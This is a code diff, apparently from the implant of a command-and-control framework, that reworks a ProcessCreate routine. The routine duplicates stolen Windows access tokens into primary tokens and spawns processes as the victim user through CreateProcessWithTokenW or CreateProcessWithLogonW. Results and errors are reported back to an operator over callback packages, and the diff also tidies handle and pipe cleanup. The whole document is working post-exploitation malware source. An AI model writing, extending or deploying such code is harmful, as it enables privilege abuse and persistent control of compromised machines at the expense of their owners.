@@ -591,7 +591,8 @@ BOOL ProcessCreate(
     BOOL            Return             = TRUE;
     PVOID           Wow64Value         = NULL;
     BOOL            DisabledWow64Redir = FALSE;
-    HANDLE          pToken             = NULL;
+    BOOL            DisabledImp        = FALSE;
+    HANDLE          PrimaryToken       = NULL;
 
     StartUpInfo.cb          = sizeof( STARTUPINFOA );
     StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -646,6 +647,7 @@ BOOL ProcessCreate(
             lpCurrentDirectory = Path;
         }
 
+        DisabledImp = TRUE;
         TokenImpersonate( FALSE );
         TokenSetSeImpersonatePriv( TRUE );
 
@@ -655,12 +657,11 @@ BOOL ProcessCreate(
         if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
             // Duplicate to make primary token (try delegation first)
-            if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken ) )
+            if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &PrimaryToken ) )
             {
-                if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken ) )
+                if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &PrimaryToken ) )
                 {
                     PRINTF( "Failed to duplicate token [%d]\n", NtGetLastError() );
-                    TokenImpersonate( TRUE );
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     Return = FALSE;
                     goto Cleanup;
@@ -669,7 +670,7 @@ BOOL ProcessCreate(
 
             PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance.Win32.CreateProcessWithTokenW(
-                    pToken,
+                    PrimaryToken,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
                     CmdLine,
@@ -682,7 +683,6 @@ BOOL ProcessCreate(
                     )
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
@@ -706,14 +706,11 @@ BOOL ProcessCreate(
                     ProcessInfo
             ) ) {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
             }
         }
-
-        TokenImpersonate(TRUE);
     }
     else
     {
@@ -766,18 +763,8 @@ BOOL ProcessCreate(
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
 
-            PUTS( "Cleanup" )
-            MemSet( s, 0, x );
-            Instance.Win32.LocalFree( s );
+            DATA_FREE( s, x );
         }
-    }
-
-    if ( Piped ) {
-        JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
-    }
-
-    if ( pToken ) {
-        SysNtClose( pToken );
     }
 
     Cleanup:
@@ -786,6 +773,32 @@ BOOL ProcessCreate(
         Instance.Win32.Wow64RevertWow64FsRedirection( Wow64Value );
     }
 #endif
+
+    if ( Return && Piped ) {
+        JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
+    }
+    else if ( ! Return && Piped )
+    {
+        if ( AnonPipe->StdOutWrite ) {
+            SysNtClose( AnonPipe->StdOutWrite );
+            AnonPipe->StdOutWrite = NULL;
+        }
+
+        if ( AnonPipe->StdOutRead ) {
+            SysNtClose( AnonPipe->StdOutRead );
+            AnonPipe->StdOutRead = NULL;
+        }
+
+        DATA_FREE( AnonPipe, sizeof( ANONPIPE ) );
+    }
+
+    if ( PrimaryToken ) {
+        SysNtClose( PrimaryToken );
+    }
+
+    if ( DisabledImp ) {
+        TokenImpersonate( TRUE );
+    }
 
     return Return;
 }
